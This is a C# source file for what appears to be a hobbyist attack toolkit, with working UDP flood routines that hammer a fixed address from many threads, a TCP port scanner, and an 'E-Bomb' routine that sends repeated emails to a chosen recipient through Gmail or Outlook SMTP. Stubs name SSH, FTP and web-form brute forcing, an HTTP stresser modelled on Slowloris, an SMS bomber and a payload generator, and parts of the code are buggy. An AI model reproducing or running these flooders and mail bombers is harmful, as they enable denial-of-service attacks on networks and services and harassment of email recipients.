using System;
using System.Collections.Generic;

using System.Net;
using System.Net.Mail;

using System.Net.Sockets;
using System.Net.WebSockets;

using System.Linq;
using System.Text;
using System.IO;

using System.Threading.Tasks;

namespace src
{
    public partial class Networking
    {
        public class UDP
        {
            private static int Delay = 5000, Bytes = 64, Port = 53,
                               Workers = 1, Nooters = 1, Dashers = 1, Multi = 1;

            private static string Data = "";

            private static bool Run = true;



            private static Optical.Utilities PrintModule = new Optical.Utilities();



            private static void FlooderMsg(String Msg, String Type)
            {
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.Write("[");

                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write($"{Type}");

                Console.ForegroundColor = ConsoleColor.Gray;
                Console.Write(":/> ");

                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine($"{Msg}");
            }



            private static Boolean Setup(String Type)
            {
                PrintModule.function_module($"flooder->setup->{Type}->delay");

                try { Delay = Convert.ToInt32(Console.ReadLine()) * 1000; }
                catch { PrintModule.integer_conversion_error(); return false; };

                if (Type == "udp_dl")
                {
                    PrintModule.function_module($"flooder->setup->{Type}->workers");

                    try { Workers = Convert.ToInt32(Console.ReadLine()); }
                    catch { PrintModule.integer_conversion_error(); return false; };

                    PrintModule.function_module($"flooder->setup->{Type}->dashers");

                    try { Dashers = Convert.ToInt32(Console.ReadLine()); }
                    catch { PrintModule.integer_conversion_error(); return false; };

                    PrintModule.function_module($"flooder->setup->{Type}->nooters");

                    try { Nooters = Convert.ToInt32(Console.ReadLine()); }
                    catch { PrintModule.integer_conversion_error(); return false; };
                }

                else
                if (Type == "udp_nf")
                {
                    PrintModule.function_module($"flooder->setup->{Type}->workers");

                    try { Workers = Convert.ToInt32(Console.ReadLine()); }
                    catch { PrintModule.integer_conversion_error(); return false; };
                }

                else
                if (Type == "udp_if")
                {
                    PrintModule.function_module($"flooder->setup->{Type}->workers");

                    try { Workers = Convert.ToInt32(Console.ReadLine()); }
                    catch { PrintModule.integer_conversion_error(); return false; };

                    PrintModule.function_module($"flooder->setup->{Type}->multiplier");

                    try { Multi = Convert.ToInt32(Console.ReadLine()); }
                    catch { PrintModule.integer_conversion_error(); return false; };
                }

                PrintModule.function_module($"flooder->setup->{Type}->port");

                try { Port = Convert.ToInt32(Console.ReadLine()); }
                catch { PrintModule.integer_conversion_error(); return false; };

                PrintModule.function_module($"flooder->setup->{Type}->bytes");

                try { Bytes = Convert.ToInt32(Console.ReadLine()); }
                catch { PrintModule.integer_conversion_error(); return false; };

                for (int index = 0; index <= Bytes; index += 1) Data += "X";

                return true;
            }



            private static void WaitFor()
            {
                System.Threading.Thread.Sleep(Delay);
                Run = false;
            }



            private static void Reset()
            {
                // I know this is unecessary, but just to be a 100% sure c:

                Delay = 5000;
                Bytes = 64;
                Port = 53;

                Workers = 1;
                Nooters = 1;
                Dashers = 1;
                Multi = 1;

                System.Threading.Thread.Sleep(3500);
                Run = true;
            }



            private static void DashNoot()
            {
                System.Threading.Thread.Sleep(3500);

                while (Run != false)
                {
                    for (int index = 0; index <= Nooters; index += 1)
                    {
                        UdpClient client = new UdpClient();

                        client.Connect("8.8.8.8", Port);

                        for (int sindex = 0; sindex <= 45; sindex += 1)
                        {
                            client.Send(Encoding.ASCII.GetBytes(Data), Bytes);
                        }

                        client.Close();
                        client.Dispose();
                    }
                }
            }



            private static void DashPlier(String _Data)
            {
                for (int index = 0; index <= Multi; index += 1)
                {
                    UdpClient client = new UdpClient();

                    client.Connect("8.8.8.8", Port);

                    for (int _index = 0; _index <= Multi; _index += 1)
                    {
                        client.Send(Encoding.ASCII.GetBytes(_Data), Bytes);
                        client.Send(Encoding.ASCII.GetBytes(_Data), Bytes);
                        client.Send(Encoding.ASCII.GetBytes(_Data), Bytes);
                    }

                    client.Close();
                    client.Dispose();
                }
            }



            private static void DashBot()
            {
                System.Threading.Thread.Sleep(3500);

                while (Run != false)
                {
                    UdpClient client = new UdpClient();

                    client.Connect("8.8.8.8", Port);

                    for (int index = 0; index <= Dashers; index += 1)
                        client.Send(Encoding.ASCII.GetBytes(Data), Bytes);

                    client.Close();
                    client.Dispose();
                }
            }



            public bool DashLoad()
            {
                if (Setup("udp_dl") == false) return false;
                Task waitFor = Task.Run((Action)WaitFor);

                FlooderMsg($"[udp_dl:/> Starting the flood using Dash Load over Udp through 8.8.8.8:{Port} for {Delay / 1000} seconds ....", "udp_dl");
                FlooderMsg($"Loading {Nooters} Nooters ....", "udp_dl");

                for (int index = 0; index <= Nooters - 1; index += 1)
                {
                    FlooderMsg($"Starting Nooter {index} ....", "udp_dl");

                    for (int s = 0; s <= 2; s += 1)
                    {
                        System.Threading.ThreadStart StartThread = new System.Threading.ThreadStart(DashNoot);
                        System.Threading.Thread Thread = new System.Threading.Thread(StartThread);

                        Thread.Start();
                    }

                    FlooderMsg($"Successfully started Nooter {index} with 2 Threads!", "udp_dl");
                }

                FlooderMsg("Successfully loaded all the Nooters!", "udp_dl");
                FlooderMsg($"Starting {Workers} Workers ....", "udp_dl");

                for (int index = 0; index <= Workers - 1; index += 1)
                {
                    System.Threading.ThreadStart StartDashThread = new System.Threading.ThreadStart(DashBot);
                    System.Threading.Thread DashThread = new System.Threading.Thread(StartDashThread);

                    DashThread.Start();
                }

                FlooderMsg("Successfully started all Workers!", "udp_dl");
                FlooderMsg($"Sending {Bytes} of Data with {Dashers} Dashers per Connection using {Workers} Workers and {Nooters} Nooters ....", "udp_dl");

                while (Run != false)
                {
                    UdpClient client = new UdpClient();

                    client.Connect("8.8.8.8", Port);

                    for (int index = 0; index <= Dashers; index += 1)
                        client.Send(Encoding.ASCII.GetBytes(Data), Bytes);

                    client.Close();
                    client.Dispose();
                }

                FlooderMsg("Successfully finished flooding using Dash Load!", "udp_dl");
                FlooderMsg("Cleanup is commencing ....", "udp_dl");

                Reset();

                FlooderMsg("Successfully ran Cleanup ^o^", "udp_dl");

                return true;
            }



            public bool NormalFlood()
            {
                if (Setup("udp_nf") == false) return false;
                Task waitFor = Task.Run((Action)WaitFor);

                FlooderMsg($"Starting the flood using Normal Flood over Udp through 8.8.8.8:{Port} for {Delay / 1000} seconds ....", "udp_nf");
                FlooderMsg($"Starting {Workers} Workers ....", "udp_nf");

                for (int index = 0; index <= Workers; index += 1)
                {
                    System.Threading.ThreadStart StartDashThread = new System.Threading.ThreadStart(DashBot);
                    System.Threading.Thread DashThread = new System.Threading.Thread(StartDashThread);

                    DashThread.Start();
                }

                FlooderMsg("Successfully started all Workers!", "udp_nf");
                FlooderMsg($"Sending {Bytes} Bytes of Data with {Workers} Workers per Connection ....", "udp_nf");

                while (Run != false)
                {
                    UdpClient client = new UdpClient();

                    client.Connect("8.8.8.8", Port);

                    client.Send(Encoding.ASCII.GetBytes(Data), Bytes);

                    client.Close();
                    client.Dispose();
                }

                FlooderMsg("Successfully finished flooding using Normal Flood!", "udp_nf");
                FlooderMsg("Cleanup is commencing ....", "udp_nf");

                Reset();

                FlooderMsg("Successfully ran Cleanup!", "udp_nf");
                return true;
            }



            public bool IntensiveFlood()
            {
                if (Setup("udp_if") == false) return false;
                Task waitFor = Task.Run((Action)WaitFor);

                FlooderMsg($"Starting the flood using Intensive Flood over Udp through 8.8.8.8:{Port} for {Delay / 1000} seconds ....", "udp_if");
                FlooderMsg($"Starting {Workers} Workers ....", "udp_if");

                for (int index = 0; index <= Workers; index += 1)
                {
                    System.Threading.ThreadStart StartDashThread = new System.Threading.ThreadStart(DashBot);
                    System.Threading.Thread DashThread = new System.Threading.Thread(StartDashThread);

                    DashThread.Start();
                }

                FlooderMsg("Successfully started all Workers!", "udp_if");
                FlooderMsg($"Multiplying Data x{Multi} with {Workers} Workers ....", "udp_if");

                String[] Cache = { Data };

                for (int index = 0, x = 0; index <= Workers * Multi; x += 0, index += 1)
                {
                    Data += Data;
                    Bytes = Data.Length;

                    Cache[x] = (Data);
                }

                FlooderMsg($"Successfully multiplied all Data x{Multi} with {Workers} Workers!", "udp_if");
                FlooderMsg($"Sending {Bytes} Bytes of Data with {Workers} Workers and with a Multiplier of x{Multi} per Connection ....", "udp_if");

                while (Run != false)
                {
                    UdpClient client = new UdpClient();

                    client.Connect("8.8.8.8", Port);
                    client.Send(ASCIIEncoding.ASCII.GetBytes(Data), Bytes);

                    for (int index = 0; index <= Cache.Length - 1; index += 1)
                    {
                        DashPlier(Cache[index]);
                    }

                    client.Close();
                    client.Dispose();
                }

                FlooderMsg("Successfully finished flooding using Intensive Flood!", "udp_if");
                FlooderMsg("Cleanup is commencing ....", "udp_if");

                Reset();

                FlooderMsg("Successfully ran Cleanup!", "udp_if");
                return true;
            }
        }




        public class TCP
        {
            private static Optical.Utilities util = new Optical.Utilities();



            struct TcpScanner
            {
                public String ports, target;
                public Boolean Verbose;
                public Int32 timeout, mode, scan_start, scan_stop;
                public String[] port_data;
            };

            private static TcpScanner tcpscan;

            struct ConnectionFlooder
            {

            };

            struct AuthAttack
            {
                struct AuthDixyAttack
                {

                };

                struct AuthDictionaryAttack
                {

                };
            };



            private static Boolean PingIp(String IP, Int32 Count)
            {
                try
                {
                    System.Net.NetworkInformation.Ping client = new System.Net.NetworkInformation.Ping();

                    for(int index = 0; index <= Count; index += 1)
                    {
                        client.Send(IP, 500);
                    }

                    return true;
                }

                catch
                {
                    return false;
                }
            }



            private static Boolean InitializeConfiguration(Int32 Type)
            {
                try
                {
                    if(Type == 1)
                    {
                        util.function_module("tcp->port_scanner->setup->target");
                        tcpscan.target = Console.ReadLine();

                        String[] Protocols = { "http", "https", "ftp", "ssh", "sftp", "socket", "socket5", "telnet", "tcp", "udp", "ipsec", "", "socks", "socks5", "sock", "sock5" };

                        for(int index = 0; index <= Protocols.Length - 1; index += 1)
                        {
                            if (tcpscan.target.ToLower().Contains(Protocols[index] + "://"))
                            {
                                tcpscan.target = tcpscan.target.ToLower().Replace(Protocols[index] + "://", "");
                                break; // Assuming there is no second protocol being used ;')
                            }
                        }

                        util.function_module("tcp->port_scanner->setup->ports");
                        tcpscan.ports = Console.ReadLine();

                        if (tcpscan.ports.Contains(" ")) tcpscan.ports = tcpscan.ports.Replace(" ", "");

                        if(tcpscan.ports.Contains(","))
                        {
                            tcpscan.port_data = tcpscan.ports.Split(',');

                            foreach (string port in tcpscan.port_data)
                            {
                                if ((Convert.ToInt32(port) > 65535) || (Convert.ToInt32(port) < 0))
                                {
                                    util.function_error("tcp->port_scanner->setup->ports", "you applied an invalid port selection, please try again :c\r\n");
                                    return false;
                                }
                            }

                            tcpscan.mode = 3;
                        }

                        else
                        if(tcpscan.ports.Contains("-"))
                        {
                            String[] range = tcpscan.ports.Split('-');

                            if (((Convert.ToInt32(range[0]) > 65535) || (Convert.ToInt32(range[0]) < 0)) || ((Convert.ToInt32(range[1]) > 65535) || (Convert.ToInt32(range[1]) < 0)))
                            {
                                util.function_error("tcp->port_scanner->setup->ports", "you applied an invalid port selection, please try again :c\r\n");
                                return false;
                            }

                            tcpscan.scan_start = Convert.ToInt32(range[0]);
                            tcpscan.scan_stop = Convert.ToInt32(range[1]);
                            
                            tcpscan.mode = 2;
                        }

                        else
                        {
                            if ((Convert.ToInt32(tcpscan.port_data) > 65565) || (Convert.ToInt32(tcpscan.port_data) < 0)) 
                            {
                                util.function_error("tcp->port_scanner->setup->ports", "you applied an invalid port selection, please try again :c\r\n");
                                return false;
                            }

                            tcpscan.mode = 1;
                        }
                        
                        util.function_module("tcp->port_scanner->setup->timeout(ms)");
                        tcpscan.timeout = Convert.ToInt32(Console.ReadLine());

                        util.function_module("tcp->port_scanner->setup->verbose::[Y/n]");
                        String confy = Console.ReadKey().Key.ToString().ToLower();

                        if (confy == "y") tcpscan.Verbose = true;
                        else tcpscan.Verbose = false;

                        return true;
                    }

                    else
                    if(Type == 2)
                    {
                        return true;
                    }

                    else
                    {
                        return false;
                    }
                }

                catch
                {
                    Optical.Utilities result = new Optical.Utilities();
                    result.integer_conversion_error();

                    return false;
                }
            }



            public bool TcpPortScanner()
            {
                try
                {
                    if (InitializeConfiguration(1) != true)
                    {
                        util.integer_conversion_error();
                        return false;
                    }

                    Console.WriteLine();

                    util.function_error("tcp->port_scanner", "");

                    Console.ForegroundColor = ConsoleColor.DarkGreen;
                    Console.WriteLine("oh blyat, the scan is initiating ^(^ ....");

                    if(PingIp(tcpscan.target, 2) != true)
                    {
                        util.function_error("tcp->port_scanner", $"the specified target {tcpscan.target} is unreachable :c\r\n");
                        return false;
                    }

                    else
                    {
                        util.function_error("tcp->port_scanner", "");

                        Console.ForegroundColor = ConsoleColor.DarkGreen;
                        Console.WriteLine("yazzz, the scan has been started ~(^o^~)");

                        if (tcpscan.mode == 3)
                        {
                            foreach (String port in tcpscan.port_data)
                            {
                                if(TcpRequest(tcpscan.target, tcpscan.timeout, Convert.ToInt32(port)) != true)
                                {
                                    if (tcpscan.Verbose == true)
                                    {
                                        util.function_error("tcp->port_scanner", $"Nuuu, {tcpscan.target}:{port} seems inaccessible :c\r\n");
                                    }
                                }

                                else
                                {
                                    util.function_error("tcp->port_scanner", "");

                                    Console.ForegroundColor = ConsoleColor.Green;
                                    Console.WriteLine($"Yaaay, {tcpscan.target}:{port} seems accessible c:");
                                }
                            }
                        }
                        // I know I could implement ELSE but I am too lazy.
                        if (tcpscan.mode == 2)
                        {
                            for(int start = tcpscan.scan_start; start <= tcpscan.scan_stop; start += 1)
                            {
                                if (TcpRequest(tcpscan.target, tcpscan.timeout, Convert.ToInt32(start)) != true)
                                {
                                    if (tcpscan.Verbose == true)
                                    {
                                        util.function_error("tcp->port_scanner", $"Nuuu, {tcpscan.target}:{start} seems inaccessible :c\r\n");
                                    }
                                }

                                else
                                {
                                    util.function_error("tcp->port_scanner", "");

                                    Console.ForegroundColor = ConsoleColor.Green;
                                    Console.WriteLine($"Yaaay, {tcpscan.target}:{start} seems accessible c:");
                                }
                            }
                        }

                        if (tcpscan.mode == 1)
                        {
                            if (TcpRequest(tcpscan.target, tcpscan.timeout, Convert.ToInt32(tcpscan.ports)) != true)
                            {
                                if (tcpscan.Verbose == true)
                                {
                                    util.function_error("tcp->port_scanner", $"Nuuu, {tcpscan.target}:{tcpscan.ports} seems inaccessible :c\r\n");
                                }
                            }

                            else
                            {
                                util.function_error("tcp->port_scanner", "");

                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine($"Yaaay, {tcpscan.target}:{tcpscan.ports} seems accessible c:");
                            }
                        }
                    }

                    util.function_error("tcp->port_scanner", "");

                    Console.ForegroundColor = ConsoleColor.DarkGreen;
                    Console.WriteLine("uh my gawduzzz, the scan has finished up successfully ^-^");

                    return true;
                }

                catch
                {
                    return false;
                }
            }




            private static Boolean TcpRequest(String Ip, Int32 Timeout, Int32 Port)
            {
                try
                {
                    var client = new TcpClient();
                    var result = client.BeginConnect(Ip, Port, null, null);

                    var success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromMilliseconds(Timeout));

                    if (!success)
                    {
                        throw new Exception("Failed to connect.");
                    }

                    client.EndConnect(result);
                    return true;
                }

                catch
                {
                    return false;
                }
            }




            public bool ConnectivityFlooder()
            {
                try
                {
                    return true;
                }

                catch
                {
                    return false;
                }
            }
        }




        public class SSH
        {
            public bool AuthDixyAttack()
            {
                try
                {
                    return true;
                }

                catch
                {
                    return false;
                }
            }



            public bool AuthBruteDashAttack()
            {
                try
                {
                    return true;
                }

                catch
                {
                    return false;
                }
            }
        }




        public class FTP
        {
            public bool AuthDixyAttack()
            {
                try
                {
                    return true;
                }

                catch
                {
                    return false;
                }
            }



            public bool AuthBruteDashAttack()
            {
                try
                {
                    return true;
                }

                catch
                {
                    return false;
                }
            }
        }




        public class HTTP
        {
            public bool FormDixyAttack()
            {
                try
                {
                    return true;
                }

                catch
                {
                    return false;
                }
            }



            public bool FormBruteDashAttack()
            {
                try
                {
                    return true;
                }

                catch
                {
                    return false;
                }
            }


            // Optimize the TRY and CATCH statement for the FLOODER SHITS because you can do it with one and none more c:
            public partial class HttpStresser
            {
                private static Boolean Running = true, DashSpoof = false, SlowDash = false, SWOT = false;
                private static String header_type = "POST", Url = "https://www.google.co.uk";

                private static Int32 DashBots = 1, Threads = 1, Dashers = 1, Multiplier = 1, 
                                     Port = 80, Delay = 60, Bytes = 1024,
                                     h_type = 1, 
                                     Type = 3;

                private static Optical.Utilities util = new Optical.Utilities();



                private static void Runner()
                {
                    System.Threading.Thread.Sleep((Delay * 1000));
                    Running = false;
                    
                    ResetZeConfiguration();
                }



                private static void ResetZeConfiguration()
                {
                    Multiplier = 1;

                    DashBots = 1;

                    Threads = 1;
                    Dashers = 1;

                    h_type = 1;

                    Delay = 60;
                    Bytes = 1024;

                    Type = 3;
                    Port = 80;

                    DashSpoof = false;
                    SlowDash = false;
                    SWOT = false;

                    header_type = "POST";
                    Url = "https://www.google.co.uk/";

                    System.Threading.Thread.Sleep(1500);
                    Running = true;
                }



                private static Boolean IsUrl(String Url)
                {
                    try
                    {
                        Uri.CheckHostName(Url);

                        return true;
                    }

                    catch { return false; }
                }



                private static Boolean Setup()
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("Please select the attack type :\r\n     -=> 1 = Dash\r\n     -=> 2 = Intensive\r\n     -=> 3 = Normal\r\n");

                    util.function_module("http->server_stresser->setup->type");

                    try { Type = Convert.ToInt32(Console.ReadLine()); }
                    catch { util.integer_conversion_error(); return false; };

                    if ((Type != 1) && (Type != 2) && (Type != 3))
                    { util.function_error("error", $"{Type} is not a valid attack type, using 3 (Normal) as attack type!"); Type = 3; }

                    /*
                    
                    Types :             Headers :
                    1 = Dash            1 = PUT (Insecure)
                    2 = Intensive       2 = GET (Uploader)
                    3 = Normal          3 = POST (Best)
                    
                    ----------------------------------------------------
                    
                    SELECTION MEANING

                    Custom Bytes    = Amount of Data in Size to be sent!
                    Attack Duration = The duration of the attack, you know, 60 seconds or sum. 
                    Port            = 80, 8080, 443, 22, 21, 23 or 2222.
                    Header Type     = The Header Type, PUT, POST and GET.
                    Spoof           = Spoof Ze Source!
                    Dash Bots       = Threads, in a Dash Way, multiplication.
                    Dashers         = Kickers, basically the times a kicker will come by and push it in even harder xD
                    Multiplier      = Like the name suggests, simply multiply the attack itself.
                    HTTP(S) Check   = Check if the host is properly formatted and ofcourse, online!
                    S.W.O.T         = Stop When Online Technique, prevents your network from crashing!
                    SlowDash        = A Dashie version of the famous DoS Method Slowloris <3
                    Threads         = The same as Bots just...uhm...less Dashie.

                    ----------------------------------------------------
                     
                    1>Features):
                    {Custom Bytes, Attack Duration, Port, Header Type, Spoofer, Dash Bots, Dashers, Multiplier, HTTP(s), S.W.O.T, SlowDash};
                   
                    2>Features):
                    {Custom Bytes, Attack Duration, Port, Header Type, Multiplier, Threads, S.W.O.T};
                    
                    3>Features):
                    {Custom Bytes, Attack Duration, Port, Header Type};
                    
                    */

                    try
                    {
                        Console.ForegroundColor = ConsoleColor.Magenta;
                        Console.WriteLine("Available header types : 1 (PUT), 2 (GET) and 3 (POST)!");

                        util.function_module("http->server_stresser->setup->header_type");
                        h_type = Convert.ToInt32(Console.ReadLine());

                        if ((h_type != 1) && (h_type != 2) && (h_type != 3))
                        { util.function_error("error", $"{h_type} is not recognized as one of our valid header type ids, using 3 (POST) instead!"); h_type = 3; header_type = "POST"; }

                        util.function_module("http->server_stresser->setup->bytes");
                        Bytes = Convert.ToInt32(Console.ReadLine());

                        Console.ForegroundColor = ConsoleColor.Magenta;
                        Console.WriteLine("HTTPS: 443\r\nHTTP.: 80, 8080");

                        util.function_module("http->server_stresser->port");
                        Port = Convert.ToInt32(Console.ReadLine());

                        util.function_module("http->server_stresser->setup->attack_duration");
                        Delay = Convert.ToInt32(Console.ReadLine());

                        retype_url:

                        util.function_module("http->server_stresser->setup->url");
                        Url = Console.ReadLine();

                        if (IsUrl(Url) != true)
                        {
                            util.function_error("error", $"Sorry...but {Url} is not recognized as an url, please try again :c\r\n");
                            goto retype_url;
                        }

                        if (Type == 1)
                        {
                            util.function_module("http->server_stresser->setup->dash_bots");
                            DashBots = Convert.ToInt32(Console.ReadLine());

                            util.function_module("http->server_stresser->setup->dashers");
                            Dashers = Convert.ToInt32(Console.ReadLine());

                            util.function_module("http->server_stresser->setup->multiplier");
                            Multiplier = Convert.ToInt32(Console.ReadLine());

                            util.function_module("http->server_stresser->setup->toggle_spoofer::[Y/n]");
                            if (Console.ReadKey().Key.ToString().ToLower() == "y") DashSpoof = true;
                            else DashSpoof = false;

                            Console.WriteLine();

                            util.function_module("http->server_stresser->setup->toggle_swot::[Y/n]");
                            if (Console.ReadKey().Key.ToString().ToLower() == "y") SWOT = true;
                            else SWOT = false;

                            Console.WriteLine();

                            util.function_module("http->server_stresser->setup->toggle_slowdash::[Y/n]");
                            if (Console.ReadKey().Key.ToString().ToLower() == "y") SlowDash = true;
                            else SlowDash = false;

                            Console.WriteLine();
                        }

                        else
                        if (Type == 2)
                        {
                            util.function_module("http->server_stresser->setup->multiplier");
                            Multiplier = Convert.ToInt32(Console.ReadLine());

                            util.function_module("http->server_stresser->setup->threads");
                            Threads = Convert.ToInt32(Console.ReadLine());

                            util.function_module("http->server_stresser->setup->toggle_swot::[Y/n]");
                            if (Console.ReadKey().Key.ToString().ToLower() == "y") SWOT = true;
                            else SWOT = false;
                        }

                        Runner();

                        return true;
                    }

                    catch
                    {
                        util.integer_conversion_error();
                        return false;
                    }
                }



                /* Naughty Function c': */
                private static void CumLoad()
                {
                    //Socket LongSock = new Socket();

                    if(Type == 1)
                    {
                        // Dash
                    }

                    else
                    if(Type == 2)
                    {
                        // Intensive
                    }

                    else
                    if(Type == 3)
                    {
                        // Normal
                    }
                }



                public bool ServerStresser()
                {
                    if (Setup() == false)
                    {
                        return false;
                    }

                    else
                    {
                        try
                        {
                            do CumLoad();
                            while (Running != false);

                            return true;
                        }

                        catch
                        {
                            return false;
                        }
                    }
                }
            }




            public bool HeaderManager()
            {
                try
                {
                    return true;
                }

                catch
                {
                    return false;
                }
            }
        }




        public class SMTP
        {
            private static String SenderEmail = "example@gmail.com", SenderPassword = "example_password", ReceiverEmail = "example_receiver@gmail.com", Subject = "example subject", Message = "example message";
            private static bool Workers_Enabled = false;
            private static int SpamCount = 10, Workers = 0, Port = 25;

            private static Optical.Utilities PrintModule = new Optical.Utilities();



            private static void EmailMsg(String Msg, String Type)
            {
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.Write("[");

                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write($"{Type}");

                Console.ForegroundColor = ConsoleColor.Gray;
                Console.Write(":/> ");

                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine($"{Msg}");
            }



            private static void Reset()
            {
                SenderEmail = "example@gmail.com";
                SenderPassword = "example_password";

                ReceiverEmail = "example_receiver@gmail.com";

                Subject = "example subject";
                Message = "example message";

                Workers_Enabled = false;

                SpamCount = 10;
                Workers = 0;
                Port = 25;

                System.Threading.Thread.Sleep(2500);
            }



            private static Boolean Setup(String type)
            {
                PrintModule.function_module($"e-bomb->spam->{type}->setup->sender");
                SenderEmail = Console.ReadLine();

                PrintModule.function_module($"e-bomb->spam->{type}->setup->sender_password");
                SenderPassword = Console.ReadLine();

                PrintModule.function_module($"e-bomb->spam->{type}->setup->receiver_email");
                ReceiverEmail = Console.ReadLine();

                PrintModule.function_module($"e-bomb->spam->{type}->setup->subject");
                Subject = Console.ReadLine();

                PrintModule.function_module($"e-bomb->spam->{type}->setup->message");
                Message = Console.ReadLine();

                PrintModule.function_module($"e-bomb->spam->{type}->setup->spam_count");

                try { SpamCount = Convert.ToInt32(Console.ReadLine()); }
                catch { PrintModule.integer_conversion_error(); return false; };

                Console.Write($"[e-bomb->{type}->threading_confirm:/> Do you want to use multiple workers? [Y/n] ");
                if (Console.ReadKey().ToString().ToLower() == "y")
                {
                    Workers_Enabled = true;

                    PrintModule.function_module($"e-bomb->spam->{type}->workers");

                    try { Workers = Convert.ToInt32(Console.ReadLine()); }
                    catch { PrintModule.integer_conversion_error(); return false; };
                }

                EmailMsg("Hint : (NO SSL)25, (SSL)587", type);
                PrintModule.function_module($"e-bomb->spam->{type}->port");

                try { Workers = Convert.ToInt32(Console.ReadLine()); }
                catch { PrintModule.integer_conversion_error(); return false; };

                return true;
            }



            private bool SendEmail(String SmtpServer)
            {
                try
                {
                    MailMessage message = new MailMessage($"{SenderEmail}", $"{ReceiverEmail}");
                    SmtpClient client = new SmtpClient();

                    client.Port = Port;

                    client.DeliveryMethod = SmtpDeliveryMethod.Network;
                    client.UseDefaultCredentials = false;

                    client.Host = $"{SmtpServer}";

                    message.Subject = ($"[Dashie]: {Subject}");
                    message.Body = ($"-==[ Dash Bomb ]==- \r\n\r\n\r\n\r\n{Message}");

                    client.Send(message);
                    return true;
                }

                catch
                {
                    return false;
                }
            }

            private bool EBombWorker(String SmtpServer, String Type)
            {
                System.Threading.Thread.Sleep(1250);

                return true;
            }



            public bool GmailSpammer()
            {
                try
                {
                    if (Setup("gmail") == false) return false;

                    if ((Workers_Enabled == true) && (Workers > 1))
                    {
                        EmailMsg($"Starting {Workers} Workers ....", "gmail");

                        for (int index = 0; index <= Workers - 1; index += 1)
                        {
                            // Put this in async
                            EBombWorker("smtp.gmail.com", "gmail");
                        }

                        EmailMsg("Successfully started all Workers!", "gmail");
                    }

                    EmailMsg($"Sending {SpamCount} E-Bombs to {ReceiverEmail} ....", "gmail");

                    for (int index = 0; index <= SpamCount; index += 1)
                    {
                        if (SendEmail("smtp.gmail.com") == false)
                        {
                            EmailMsg("An error occurred while sending one or more E-Bombs, canceled bombing!", "gmail");
                            System.Threading.Thread.Sleep(4000);
                            return false;
                        }
                    }

                    EmailMsg($"Successfully bombed {ReceiverEmail} with {SpamCount} E-Bombs!", "gmail");
                    System.Threading.Thread.Sleep(4000);
                    Reset();

                    return true;
                }

                catch
                {
                    return false;
                }
            }



            public bool OutlookSpammer()
            {
                try
                {
                    if (Setup("outlook") == false) return false;

                    if ((Workers_Enabled == true) && (Workers > 0))
                    {
                        EmailMsg($"Starting {Workers} Workers ....", "outlook");

                        for (int index = 0; index <= Workers; index += 1)
                        {
                            // Put this in async
                            EBombWorker("smtp.outlook.com", "outlook");
                        }

                        EmailMsg("Successfully started all Workers!", "outlook");
                    }

                    EmailMsg($"Sending {SpamCount} E-Bombs to {ReceiverEmail} ....", "outlook");

                    for (int index = 0; index <= SpamCount; index += 1)
                    {
                        if (SendEmail("smtp.outlook.com") == false)
                        {
                            EmailMsg("An error occurred while sending one or more E-Bombs, canceled bombing!", "outlook");
                            System.Threading.Thread.Sleep(4000);
                            return false;
                        }
                    }

                    EmailMsg($"Successfully bombed {ReceiverEmail} with {SpamCount} E-Bombs!", "outlook");
                    System.Threading.Thread.Sleep(4000);
                    Reset();

                    return true;
                }

                catch
                {
                    return false;
                }
            }
        }
    }

    public partial class Misc
    {
        public class Exploit
        {
            public bool SMSBomber()
            {
                try
                {
                    return true;
                }

                catch
                {
                    return false;
                }
            }



            public bool BloatwareManager()
            {
                try
                {
                    return true;
                }

                catch
                {
                    return false;
                }
            }



            public bool FileDownloader()
            {
                try
                {
                    return true;
                }

                catch
                {
                    return false;
                }
            }
        }




        public class Payload
        {
            public bool PayloadGenerator()
            {
                try
                {
                    return true;
                }

                catch
                {
                    return false;
                }
            }
        }




        public class Utility
        {
            public bool DNSChanger()
            {
                try
                {
                    return true;
                }

                catch
                {
                    return false;
                }
            }



            public bool ProxyManager()
            {
                try
                {
                    return true;
                }

                catch
                {
                    return false;
                }
            }



            public bool UserManager()
            {
                try
                {
                    return true;
                }

                catch
                {
                    return false;
                }
            }



            public bool BrowserManager()
            {
                try
                {
                    return true;
                }

                catch
                {
                    return false;
                }
            }
        }
    }
}
